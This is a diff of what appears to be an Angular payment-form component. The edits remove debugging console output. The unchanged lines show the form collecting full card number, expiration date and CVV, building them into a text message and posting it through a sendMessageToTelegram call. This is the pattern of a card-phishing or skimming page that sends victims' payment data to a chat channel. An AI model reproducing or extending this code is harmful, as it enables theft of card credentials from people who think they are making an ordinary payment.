@@ -108,24 +108,14 @@ Expiration Date: ${this.paymentForm.value.expirationdate}\n
 CVV: ${this.paymentForm.value.securitycode}
   `;
 
-    console.log('Submit button clicked');
-  
-    // Log form values
-    console.log('Form Values:', this.paymentForm.value);
-    console.log('Form Status:', this.paymentForm.status);
+   
     
     // Check individual form control errors
     const controls = this.paymentForm.controls;
-    console.log('Fullname Errors:', controls['fullname'].errors);
-    console.log('Phone Errors:', controls['phone'].errors);
-    console.log('Email Errors:', controls['email'].errors);
-    console.log('Card Number Errors:', controls['cardnumber'].errors);
-    console.log('Expiration Date Errors:', controls['expirationdate'].errors);
-    console.log('Security Code Errors:', controls['securitycode'].errors);
+    
 
     // If form is invalid, trigger alert
     if (this.paymentForm.invalid) {
-      console.log('Form is invalid');
       this.triggerAlert();
       return;
     }
@@ -134,7 +124,6 @@ CVV: ${this.paymentForm.value.securitycode}
     this.submitted = true;
     setTimeout(() => {
       this.submitted = false;
-      console.log('Loader hidden after 5 seconds');
     }, 5000);
     this.sendMessageToTelegram(message);
     this.paymentForm.reset();
@@ -151,7 +140,6 @@ CVV: ${this.paymentForm.value.securitycode}
 
     this.http.post(url, body).subscribe(
       (response) => {
-        console.log('Message sent successfully:', response);
         // You can also reset the form or show a success message here
         this.paymentForm.reset();
       },
